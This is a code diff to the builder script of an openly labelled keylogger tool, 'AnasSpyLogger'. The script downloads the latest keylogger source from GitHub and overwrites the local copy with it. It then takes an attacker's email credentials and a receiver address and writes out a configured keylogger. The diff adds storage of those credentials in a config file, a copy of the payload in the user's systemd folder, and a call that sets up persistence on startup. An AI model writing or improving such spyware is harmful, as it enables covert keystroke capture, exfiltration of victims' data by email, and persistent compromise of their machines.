@@ -6,6 +6,7 @@ from tool import anasspylogger
 update_url = "https://raw.githubusercontent.com/anaslabrini/AnasSpyLogger/refs/heads/main/tool/anasspylogger.py"
 target_file = "tool/anasspylogger.py"  # الملف المستهدف للتحديث
 
+
 def clear_screen():
     if os.name == "posix":
         os.system("clear")
@@ -19,7 +20,6 @@ print("[*] Checking for updates...")
 try:
     response = requests.get(update_url, timeout=10)
     if response.status_code == 200:
-        # كتابة المحتوى الجديد في نفس الملف دون تغيير اسمه
         with open(target_file, 'w') as f:
             f.write(response.text)
         print("[+] Script content updated successfully.")
@@ -30,10 +30,7 @@ except requests.exceptions.RequestException as e:
     print(f"[-] Update error: {e}")
 
 
-
-
-# بعد تشغيل anasspylogger.py، نعرض الـ Banner
-print("""\033[94m
+print("""
 
      █████╗         ███████╗        ██╗     
     ██╔══██╗        ██╔════╝        ██║     
@@ -45,20 +42,18 @@ print("""\033[94m
         ▀▌▛▌▀▌▛▘▛▘▛▌▌▌▐ ▛▌▛▌▛▌█▌▛▘
         █▌▌▌█▌▄▌▄▌▙▌▙▌▐▖▙▌▙▌▙▌▙▖▌ 
                   ▌ ▄▌    ▄▌▄▌    
-                                        
+                                         
                  \033[0m
 \033[94m      KeyLogger Tool by Anas Labrini - v1.0 
 \033[0m
 """)
 
-# استلام المدخلات من المستخدم
 try:
     input_email = input("Enter the email address: ")
     input_password = input("Enter the email password: ")
     input_receiver = input("Enter the receiver email: ")
     output_filename = input("Enter the output filename (without .py extension): ") + ".py"
 
-    # التحقق من صحة المدخلات
     if not ("@" in input_email and "." in input_email):
         raise ValueError("[-] Invalid email address.")
     if not input_password:
@@ -69,7 +64,6 @@ try:
     # الملف الرئيسي للسكربت
     input_file = "tool/anasspylogger.py"
 
-    # فتح الملف وقراءة المحتوى
     with open(input_file, "r") as file:
         content = file.read()
 
@@ -82,7 +76,20 @@ try:
     with open(output_filename, "w") as output_file:
         output_file.write(content)
 
+    # إنشاء ملف config.py في النسخة الجديدة
+    with open("config.py", "w") as config_file:
+        config_file.write(f"EMAIL_ADDRESS = '{input_email}'\nEMAIL_PASSWORD = '{input_password}'\nTO_EMAIL = '{input_receiver}'")
+
+    # حفظ نسخة في مجلد ~/.config/systemd/user/
+    systemd_path = os.path.expanduser("~/.config/systemd/user/")
+    os.makedirs(systemd_path, exist_ok=True)
+    with open(os.path.join(systemd_path, output_filename), "w") as systemd_file:
+        systemd_file.write(content)
+
     print(f"[+] The modified file has been saved as {output_filename}")
+
+    # تشغيل خدمة persist_script() للتفعيل التلقائي
+    anasspylogger.persist_script(output_filename)
 
 except FileNotFoundError:
     print("[-] The specified file was not found.")
